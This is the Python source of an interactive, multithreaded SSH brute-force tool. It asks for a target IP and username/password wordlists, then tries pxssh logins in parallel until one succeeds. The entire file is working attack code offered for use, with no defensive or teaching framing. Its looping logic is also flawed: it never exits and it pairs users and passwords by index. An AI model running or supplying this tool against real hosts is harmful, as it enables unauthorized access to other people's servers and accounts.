# © SSH Bruteforcer- Made by Yuval Simon. For www.bogan.cool

import time, threading, subprocess
from pexpect import pxssh
from colorama import Fore


class Main():
    def __init__(self):
        subprocess.call('clear', shell=True)

        print(f"""{Fore.RED}
  ██████  ██████ ██░ ██     ▄▄▄▄   ██▀███  █    ██▄▄▄█████▓█████  █████▒
▒██    ▒▒██    ▒▓██░ ██▒   ▓█████▄▓██ ▒ ██▒██  ▓██▓  ██▒ ▓▓█   ▀▓██   ▒ 
░ ▓██▄  ░ ▓██▄  ▒██▀▀██░   ▒██▒ ▄█▓██ ░▄█ ▓██  ▒██▒ ▓██░ ▒▒███  ▒████ ░ 
  ▒   ██▒ ▒   ██░▓█ ░██    ▒██░█▀ ▒██▀▀█▄ ▓▓█  ░██░ ▓██▓ ░▒▓█  ▄░▓█▒  ░ 
▒██████▒▒██████▒░▓█▒░██▓   ░▓█  ▀█░██▓ ▒██▒▒█████▓  ▒██▒ ░░▒████░▒█░    
▒ ▒▓▒ ▒ ▒ ▒▓▒ ▒ ░▒ ░░▒░▒   ░▒▓███▀░ ▒▓ ░▒▓░▒▓▒ ▒ ▒  ▒ ░░  ░░ ▒░ ░▒ ░    
░ ░▒  ░ ░ ░▒  ░ ░▒ ░▒░ ░   ▒░▒   ░  ░▒ ░ ▒░░▒░ ░ ░    ░    ░ ░  ░░      
░  ░  ░ ░  ░  ░  ░  ░░ ░    ░    ░  ░░   ░ ░░░ ░ ░  ░        ░   ░ ░    
      ░       ░  ░  ░  ░    ░        ░       ░               ░  ░       
                                 ░                                      
        """)

        print(f"{Fore.BLUE}1. Use a wordlist for both unames and passwords\n2. Use seperated unames list and password list:\n3. Use Uname:Pass File (Sperated by ':')\n")
        self.op = input(':')
        self.verbose = input('\n\n[CONSLOE] Print failes: ')
        self.thr = int(input('[CONSLOE] Please enter threads number (10-100): '))
        self.timeout = float(input('[CONSLOE] Timeout between each check (0.1-2): '))
        self.target = input('[CONSLOE] Please enter target ip: ')

        self.found = False
        self.yes = ["yes", "y", "ye", "Y", "YES", 'YE']
        self.checked = 0
        self.fails = 0

    def connect(self, host, uname, password):
        try:
            uname = uname.replace("\n", "")
            password = password.replace("\n", "")
            s = pxssh.pxssh()
            s.login(host, uname, password)
            print(f'{Fore.GREEN} Password Found! {uname} {password}')
            self.found = True
            
        except pxssh.ExceptionPxssh:
            self.fails += 1
            if self.verbose in self.yes:
                print(f'{Fore.RED}Password inccorect! {uname}, {password}')

        except Exception as e:
            print(e)


    def extract(self, path):
        users = []
        passwords = []
        for line in path:
            try:
                user = line.split(":")[0].replace('\n', '')
                password = line.split(":")[1].replace('\n', '')
                users.append(user)
                passwords.append(password)
            except:
                pass
        return users, passwords


    def start(self):
        threads = []
        if self.op == '1':
            path = input('\nWordlist path: ')
            wordlist = [word for word in open(path, 'r+', encoding='utf-8')]

            while True:
                if self.found == False:
                    if threading.active_count() < int(self.thr):
                        if self.checked < len(wordlist):
                            t = threading.Thread(target= self.connect, args=[self.target, wordlist[self.checked], wordlist[self.checked]])
                            t.start()
                            self.checked += 1

                        elif self.checked >= len(wordlist):
                            for t in threads:
                                t.join()

                elif self.found == True:
                    for t in threads:
                        t.join()

        elif self.op == '2':
            path1 = input('\nUser list path: ')
            path2 = input('Password list path: ')
            users = [user for user in open(path1, "r+", encoding='utf-8')]
            passwords = [password for password in open(path2, "r+", encoding='utf-8')]

            while True:
                if self.found == False:
                    if threading.active_count() < int(self.thr):
                        if self.checked < len(users):
                            t = threading.Thread(target= self.connect, args=[self.target, users[self.checked], passwords[self.checked]])
                            t.start()
                            self.checked += 1

                        elif self.checked >= len(users):
                            for t in threads:
                                t.join()

                elif self.found == True:
                    for t in threads:
                        t.join()

        elif self.op == '3':
            subprocess.call('clear', shell=True)
            path = input('\nUserPass file path: ')
            File = open(path, 'r+', encoding='utf-8')
            users, passwords = self.extract(File)

            while True:
                if self.found == False:
                    if threading.active_count() < int(self.thr):
                        if self.checked < len(users):
                            t = threading.Thread(target= self.connect, args=[self.target, users[self.checked], passwords[self.checked]])
                            t.start()
                            self.checked += 1

                        elif self.checked >= len(users):
                            for t in threads:
                                t.join()

                elif self.found == True:
                    for t in threads:
                        t.join()
        return